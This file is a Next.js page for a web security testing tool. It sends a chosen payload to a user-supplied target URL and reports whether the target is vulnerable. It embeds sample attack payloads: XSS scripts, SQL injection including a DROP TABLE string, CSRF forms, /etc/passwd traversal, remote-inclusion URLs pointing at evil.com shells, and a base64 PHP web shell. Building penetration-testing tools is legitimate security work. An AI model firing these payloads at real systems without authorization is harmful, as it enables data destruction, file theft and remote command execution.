'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { auth } from '@/lib/auth';
import { apiClient } from '@/lib/api';
import Navbar from '@/components/Navbar';
import Sidebar from '@/components/Sidebar';
import { Zap, Globe, Code, AlertTriangle, CheckCircle, XCircle, Loader, Info } from 'lucide-react';

interface PayloadResult {
  payload_type: string;
  target_url: string;
  payload: string;
  success: boolean;
  response: {
    status_code: number;
    response_time: string;
    content_length: number;
    headers: Record<string, string>;
    vulnerability_detected?: boolean;
    evidence?: string;
    risk_level?: string;
    recommendation?: string;
    protection?: string;
    database_type?: string;
  };
  timestamp: string;
}

const payloadTypes = [
  { value: 'xss', label: 'Cross-Site Scripting (XSS)', color: 'red' },
  { value: 'sqli', label: 'SQL Injection', color: 'orange' },
  { value: 'csrf', label: 'Cross-Site Request Forgery', color: 'yellow' },
  { value: 'lfi', label: 'Local File Inclusion', color: 'purple' },
  { value: 'rfi', label: 'Remote File Inclusion', color: 'blue' }
];

const samplePayloads = {
  xss: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    'javascript:alert("XSS")',
    '"><script>alert("XSS")</script>'
  ],
  sqli: [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT null,null,null--",
    "admin'--"
  ],
  csrf: [
    '<form action="/transfer" method="POST"><input name="amount" value="1000"><input name="to" value="attacker"></form>',
    '<img src="/delete?id=1" width="0" height="0">',
    '<iframe src="/admin/delete_user?id=1" width="0" height="0"></iframe>'
  ],
  lfi: [
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '/etc/passwd%00',
    'php://filter/read=string.rot13/resource=index.php'
  ],
  rfi: [
    'http://evil.com/shell.txt',
    'ftp://evil.com/shell.php',
    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+',
    'expect://id'
  ]
};

export default function PayloadTesting() {
  const [payloadType, setPayloadType] = useState('xss');
  const [targetUrl, setTargetUrl] = useState('');
  const [payload, setPayload] = useState('');
  const [isTesting, setIsTesting] = useState(false);
  const [testResult, setTestResult] = useState<PayloadResult | null>(null);
  const [error, setError] = useState('');
  const router = useRouter();

  useEffect(() => {
    if (!auth.isAuthenticated()) {
      router.push('/login');
    }
  }, [router]);

  useEffect(() => {
    // Set default payload when type changes
    const samples = samplePayloads[payloadType as keyof typeof samplePayloads];
    if (samples && samples.length > 0) {
      setPayload(samples[0]);
    }
  }, [payloadType]);

  const handleTest = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setIsTesting(true);
    setTestResult(null);

    try {
      const response = await apiClient.testPayload(payloadType, targetUrl, payload);
      setTestResult(response.data);
    } catch (err: any) {
      setError(err.response?.data?.detail || 'Payload test failed. Please try again.');
    } finally {
      setIsTesting(false);
    }
  };

  const loadSamplePayload = (samplePayload: string) => {
    setPayload(samplePayload);
  };

  const getRiskLevelColor = (level: string) => {
    switch (level?.toLowerCase()) {
      case 'critical':
        return 'text-red-400 bg-red-400/10';
      case 'high':
        return 'text-orange-400 bg-orange-400/10';
      case 'medium':
        return 'text-yellow-400 bg-yellow-400/10';
      case 'low':
        return 'text-green-400 bg-green-400/10';
      default:
        return 'text-gray-400 bg-gray-400/10';
    }
  };

  const getStatusColor = (status: number) => {
    if (status >= 200 && status < 300) return 'text-green-400';
    if (status >= 400 && status < 500) return 'text-yellow-400';
    if (status >= 500) return 'text-red-400';
    return 'text-gray-400';
  };

  return (
    <div className="min-h-screen bg-gray-900">
      <Navbar />
      <div className="flex">
        <Sidebar />
        <div className="md:pl-64 flex flex-col flex-1">
          <main className="flex-1">
            <div className="py-6">
              <div className="max-w-7xl mx-auto px-4 sm:px-6 md:px-8">
                {/* Header */}
                <div className="mb-8">
                  <div className="flex items-center space-x-3">
                    <Zap className="h-8 w-8 text-red-500" />
                    <h1 className="text-2xl font-semibold text-white">Payload Testing</h1>
                  </div>
                  <p className="mt-1 text-sm text-gray-400">
                    Test various attack payloads including XSS, SQLi, CSRF, and file inclusion attacks
                  </p>
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                  {/* Test Form */}
                  <div className="lg:col-span-2">
                    <div className="bg-gray-800 shadow rounded-lg p-6 mb-8">
                      <form onSubmit={handleTest} className="space-y-6">
                        {/* Payload Type Selection */}
                        <div>
                          <label className="block text-sm font-medium text-gray-300 mb-3">
                            Payload Type
                          </label>
                          <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                            {payloadTypes.map((type) => (
                              <label key={type.value} className="relative">
                                <input
                                  type="radio"
                                  name="payloadType"
                                  value={type.value}
                                  checked={payloadType === type.value}
                                  onChange={(e) => setPayloadType(e.target.value)}
                                  className="sr-only"
                                />
                                <div className={`cursor-pointer rounded-lg border-2 p-3 transition-colors ${
                                  payloadType === type.value
                                    ? 'border-red-500 bg-red-500/10'
                                    : 'border-gray-600 bg-gray-700 hover:border-gray-500'
                                }`}>
                                  <div className="text-sm font-medium text-white">{type.label}</div>
                                  <div className="text-xs text-gray-400 uppercase">{type.value}</div>
                                </div>
                              </label>
                            ))}
                          </div>
                        </div>

                        {/* Target URL */}
                        <div>
                          <label htmlFor="targetUrl" className="block text-sm font-medium text-gray-300 mb-2">
                            Target URL
                          </label>
                          <div className="relative">
                            <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                              <Globe className="h-5 w-5 text-gray-400" />
                            </div>
                            <input
                              type="url"
                              id="targetUrl"
                              value={targetUrl}
                              onChange={(e) => setTargetUrl(e.target.value)}
                              className="block w-full pl-10 pr-3 py-2 border border-gray-600 rounded-md bg-gray-700 text-white placeholder-gray-400 focus:outline-none focus:ring-red-500 focus:border-red-500"
                              placeholder="https://example.com/vulnerable-page"
                              required
                            />
                          </div>
                        </div>

                        {/* Payload Input */}
                        <div>
                          <label htmlFor="payload" className="block text-sm font-medium text-gray-300 mb-2">
                            Payload
                          </label>
                          <div className="relative">
                            <div className="absolute top-3 left-3 pointer-events-none">
                              <Code className="h-5 w-5 text-gray-400" />
                            </div>
                            <textarea
                              id="payload"
                              value={payload}
                              onChange={(e) => setPayload(e.target.value)}
                              rows={4}
                              className="block w-full pl-10 pr-3 py-2 border border-gray-600 rounded-md bg-gray-700 text-white placeholder-gray-400 focus:outline-none focus:ring-red-500 focus:border-red-500 font-mono text-sm"
                              placeholder="Enter your payload here..."
                              required
                            />
                          </div>
                        </div>

                        {error && (
                          <div className="bg-red-900/50 border border-red-500 rounded-md p-4">
                            <div className="flex">
                              <AlertTriangle className="h-5 w-5 text-red-400" />
                              <div className="ml-3">
                                <p className="text-sm text-red-300">{error}</p>
                              </div>
                            </div>
                          </div>
                        )}

                        <button
                          type="submit"
                          disabled={isTesting}
                          className="w-full sm:w-auto flex items-center justify-center px-4 py-2 border border-transparent text-sm font-medium rounded-md text-white bg-red-600 hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          {isTesting ? (
                            <>
                              <Loader className="animate-spin -ml-1 mr-3 h-5 w-5" />
                              Testing Payload...
                            </>
                          ) : (
                            <>
                              <Zap className="-ml-1 mr-2 h-5 w-5" />
                              Test Payload
                            </>
                          )}
                        </button>
                      </form>
                    </div>
                  </div>

                  {/* Sample Payloads */}
                  <div className="lg:col-span-1">
                    <div className="bg-gray-800 shadow rounded-lg p-6">
                      <h3 className="text-lg font-medium text-white mb-4">Sample Payloads</h3>
                      <div className="space-y-2">
                        {samplePayloads[payloadType as keyof typeof samplePayloads]?.map((sample, index) => (
                          <button
                            key={index}
                            onClick={() => loadSamplePayload(sample)}
                            className="w-full text-left p-3 bg-gray-700 hover:bg-gray-600 rounded-md transition-colors"
                          >
                            <code className="text-sm text-green-400 break-all">{sample}</code>
                          </button>
                        ))}
                      </div>
                      
                      <div className="mt-4 p-3 bg-blue-900/30 border border-blue-500/30 rounded-md">
                        <div className="flex">
                          <Info className="h-5 w-5 text-blue-400 mt-0.5" />
                          <div className="ml-3">
                            <p className="text-sm text-blue-300">
                              Click on any sample payload to load it into the payload field. Always test on authorized systems only.
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Test Results */}
                {testResult && (
                  <div className="space-y-6">
                    {/* Result Summary */}
                    <div className="bg-gray-800 shadow rounded-lg p-6">
                      <div className="flex items-center justify-between mb-4">
                        <h2 className="text-lg font-medium text-white">Test Results</h2>
                        <div className="flex items-center space-x-2">
                          {testResult.success ? (
                            <>
                              <CheckCircle className="h-5 w-5 text-green-400" />
                              <span className="text-green-400 text-sm font-medium">VULNERABLE</span>
                            </>
                          ) : (
                            <>
                              <XCircle className="h-5 w-5 text-red-400" />
                              <span className="text-red-400 text-sm font-medium">NOT VULNERABLE</span>
                            </>
                          )}
                        </div>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
                        <div className="bg-gray-700 rounded-lg p-4">
                          <p className="text-xs text-gray-400">Status Code</p>
                          <p className={`text-sm font-medium ${getStatusColor(testResult.response.status_code)}`}>
                            {testResult.response.status_code}
                          </p>
                        </div>
                        
                        <div className="bg-gray-700 rounded-lg p-4">
                          <p className="text-xs text-gray-400">Response Time</p>
                          <p className="text-sm font-medium text-white">{testResult.response.response_time}</p>
                        </div>
                        
                        <div className="bg-gray-700 rounded-lg p-4">
                          <p className="text-xs text-gray-400">Content Length</p>
                          <p className="text-sm font-medium text-white">{testResult.response.content_length} bytes</p>
                        </div>
                        
                        {testResult.response.risk_level && (
                          <div className="bg-gray-700 rounded-lg p-4">
                            <p className="text-xs text-gray-400">Risk Level</p>
                            <span className={`inline-flex px-2 py-1 text-xs font-semibold rounded-full ${getRiskLevelColor(testResult.response.risk_level)}`}>
                              {testResult.response.risk_level.toUpperCase()}
                            </span>
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Vulnerability Details */}
                    {testResult.success && testResult.response.evidence && (
                      <div className="bg-gray-800 shadow rounded-lg p-6">
                        <h3 className="text-lg font-medium text-white mb-4">Vulnerability Details</h3>
                        <div className="space-y-4">
                          <div className="bg-gray-700 rounded-lg p-4">
                            <h4 className="text-sm font-medium text-white mb-2">Evidence</h4>
                            <p className="text-sm text-gray-300">{testResult.response.evidence}</p>
                          </div>
                          
                          {testResult.response.database_type && (
                            <div className="bg-gray-700 rounded-lg p-4">
                              <h4 className="text-sm font-medium text-white mb-2">Database Type</h4>
                              <p className="text-sm text-gray-300">{testResult.response.database_type}</p>
                            </div>
                          )}
                          
                          {testResult.response.recommendation && (
                            <div className="bg-blue-900/30 border border-blue-500/30 rounded-lg p-4">
                              <h4 className="text-sm font-medium text-blue-300 mb-2">Recommendation</h4>
                              <p className="text-sm text-blue-200">{testResult.response.recommendation}</p>
                            </div>
                          )}
                        </div>
                      </div>
                    )}

                    {/* Protection Details */}
                    {!testResult.success && testResult.response.protection && (
                      <div className="bg-gray-800 shadow rounded-lg p-6">
                        <h3 className="text-lg font-medium text-white mb-4">Protection Detected</h3>
                        <div className="bg-green-900/30 border border-green-500/30 rounded-lg p-4">
                          <p className="text-sm text-green-200">{testResult.response.protection}</p>
                        </div>
                      </div>
                    )}

                    {/* Response Headers */}
                    <div className="bg-gray-800 shadow rounded-lg p-6">
                      <h3 className="text-lg font-medium text-white mb-4">Response Headers</h3>
                      <div className="bg-gray-700 rounded-lg p-4">
                        <pre className="text-sm text-gray-300 overflow-x-auto">
                          {Object.entries(testResult.response.headers).map(([key, value]) => (
                            <div key={key} className="mb-1">
                              <span className="text-blue-400">{key}:</span> <span className="text-green-400">{value}</span>
                            </div>
                          ))}
                        </pre>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </main>
        </div>
      </div>
    </div>
  );
}